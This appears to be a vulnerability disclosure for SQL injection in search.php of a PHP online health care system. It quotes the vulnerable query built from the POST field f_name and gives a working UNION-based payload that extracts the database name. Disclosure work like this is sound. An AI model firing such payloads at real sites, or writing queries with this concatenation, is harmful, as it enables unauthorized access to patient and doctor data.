### Online Health Care System in PHP with Full Source Code

#### Affected version

Online Health Care System in PHP with Full Source Code

#### **supplier**

https://www.sourcecodester.com/php/14526/online-health-care-system-php-full-source-code-2020.html

#### Vendor

https://www.sourcecodester.com/

#### **Vulnerability file**

search.php

#### Description

Online Health Care System in PHP with Full Source Code. In the search.php，the f_name parameters passed by the POST are concatenated into the query1 sql statement, and there is SQL injection.

#### **code analysis**

Here’s the translation:

"In `search.php`, the `_POST['f_name']` receives the request and is stored in the variable `$name`. Then, `$name` is concatenated into the SQL query `query1`, which can trigger an SQL injection vulnerability. This may lead to data leakage or even result in gaining server access."

![image-20240820205513595](https://github.com/user-attachments/assets/f595f2e3-3567-4a13-ac13-d65b4653c61b)

![image-20240820205543674](https://github.com/user-attachments/assets/be3a078f-690a-4bae-8906-d6af4fa7a421)

	$name=$_POST['f_name'];  
	$query1 = "SELECT * from doctor inner join schedule on schedule.d_id=doctor.id WHERE  (permission='approved' OR permission='Added') AND (f_name like'%$name%'  or f_name like'%$name%')";   
	$run = mysqli_query($db,$query1);

####  **POC**

```
1%' or 1=1 )  UNION SELECT 1,2,3,4,5,database(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
```

In `index.php`, entering the following payload in the search box can retrieve the database name.

![image-20240820205350796](https://github.com/user-attachments/assets/2482639c-3a22-4137-b4ef-e86344118663)

**You can see the database name echoed back**

![image-20240820205408380](https://github.com/user-attachments/assets/209ad025-29af-4726-b54f-3c3d73ab03b6)